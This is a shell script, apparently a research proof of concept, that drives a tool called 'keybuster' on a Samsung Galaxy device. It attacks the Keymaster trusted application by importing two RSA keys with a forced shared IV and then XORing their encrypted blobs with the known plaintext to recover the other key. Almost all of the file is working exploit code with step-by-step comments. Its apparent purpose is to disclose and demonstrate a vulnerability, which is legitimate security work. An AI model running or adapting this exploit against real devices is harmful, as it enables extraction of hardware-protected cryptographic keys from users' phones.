#!/bin/sh

set -e
cd /data/local/tmp
chmod +x ./keybuster

if [ ! -f "key_1_4096.der" ]; then
    echo "must copy key_1_4096.der to /data/local/tmp"
    exit 1
fi
if [ ! -f "key_2_4096.der" ]; then
    echo "must copy key_2_4096.der to /data/local/tmp"
    exit 1
fi

echo "\
We show an attack on the Keymaster TA in Samsung Galaxy devices: we will force a collision \
in both the encryption key and the IV that are used to
encrypt two key blobs - blob_a (unknown target key) and blob_b (known key) - \
then xor the encrypted data of blob_a with
the encrypted data of blob_b and with the known plaintext of blob_b to recover the plaintext of blob_a."

echo "\nIn reality blob_a is unknown. For the purposes of the PoC, \
we use a known key for blob_a and show that we can fully recover it from the xor of its
encrypted key material with the encrypted key material of blob_b (that collides with it) \
and the known key material of blob_b.
Other ways to verify the correctness of the recovered key include performing a cryptographic operation (e.g. sign/decrypt)
with blob_a and with the recovered key and verifying that the outputs are equal."

echo "\nIn this demo, we import key_1_4096.der (DER of 4096-bit RSA key) as blob_a,
then import a known key blob as blob_b with colliding encryption key and IV and
recover the key material of blob_a.\n"

sha256sum key_1_4096.der

echo "Attack log: $(realpath attack.log)"

sep=$(printf "%100s")

echo -e ${sep// /-}

# 1. Generate the target ekey blob (that we wish to recover).
#
#    For the purposes of the PoC, we use a known key to show that the attack fully recovers it.
#    In reality, the key material for blob_a can be unknown.
#
#    We can generate an ekey blob with a known key blob using importKey command for any key (AES/DES/RSA/EC/HMAC).
#
#    The tool (keybuster) parses the output ekey blob and creates 3 files:
#       1. The IV that was used to encrypt it (iv-blob_a.bin) taken from KM_TAG_EKEY_BLOB_IV
#       2. The encrypted serialized key material (encrypted-blob_a.bin) taken from ekey_blob->ekey
#       3. The ekey blob (blob_a.bin)
#

echo -n "1. Importing key_1_4096.der to a v15 ekey blob..."

./keybuster -c import -i id -d data -e blob_a.bin --key-size 4096 --enc-ver 15 -p key_1_4096.der --algorithm rsa 2&> attack.log

echo "done"

echo -e ${sep// /-}

# 2. Create an ekey blob with known key material that collides with the first blob, using importKey.
#
#   The tool (keybuster) will pass the IV that we specify (iv-blob_a.bin) to the keymaster,
#   then create the output ekey blob (blob_b.bin) as well as the encrypted key material (encrypted-blob_b.bin).
#
#   Overall:
#       - A new ekey blob (blob_b.bin) will be created using the same IV that the other blob used (blob_a)
#       - The new ekey blob has known key material (plain-blob_b.bin)

echo -n "2. Importing a known v15 key blob (key_2_4096.der) with the same IV, app id and app data \
that were used to create blob_a..."

./keybuster -c import -i id -d data -e blob_b.bin --key-size 4096 --enc-ver 15 -p key_2_4096.der --algorithm rsa --iv iv-blob_a.bin 2&> attack.log

echo "done"

echo "Note: the length of the known key must be at least as long as than the unknown"

cp key_2_4096.der plain-blob_b.bin

echo -e ${sep// /-}

# 3. Xor the known key, its ekey and the unknown ekey to fully recover the unknown key material.
#
#   The tool (keybuster) receives:
#   - the known key material (plain-blob_b.bin)
#   - the encrypted key material for the known blob (encrypted-blob_b.bin)
#   - the encrypted key material for the unknown blob (blob_b.bin)
#
#   It outputs the recovered key material for the unknown ekey (recovered-blob_a.bin)
#

echo -n "3. Xor the known key material of blob_b with the encrypted key material of blob_b and the encrypted key material of blob_a..."

./keybuster -c attack -p plain-blob_b.bin -e encrypted-blob_b.bin -s encrypted-blob_a.bin -o recovered-blob_a.bin 2&>> attack.log

echo "done"

echo -e ${sep// /-}

der_1_len=$(stat -c %s key_1_4096.der)
der_2_len=$(stat -c %s key_2_4096.der)
recovered_len=$(stat -c %s recovered-blob_a.bin)

echo "key_1_4096.der has $der_1_len bytes, key_2_4096.der has $der_2_len bytes and recovered-blob_a has $recovered_len bytes"
echo "since recovered-blob_a has extra bytes, truncate it to $der_1_len bytes (truncated-recovered-blob_a.bin)\n"
dd if=recovered-blob_a.bin of=truncated-recovered-blob_a.bin bs=$der_1_len count=1 &> /dev/null

echo -n "comparing the truncated recovered key against the key we imported for blob_a (key_1_4096.der)..."
diff truncated-recovered-blob_a.bin key_1_4096.der
echo "done"

sha256sum truncated-recovered-blob_a.bin

echo "successully recovered key material!"
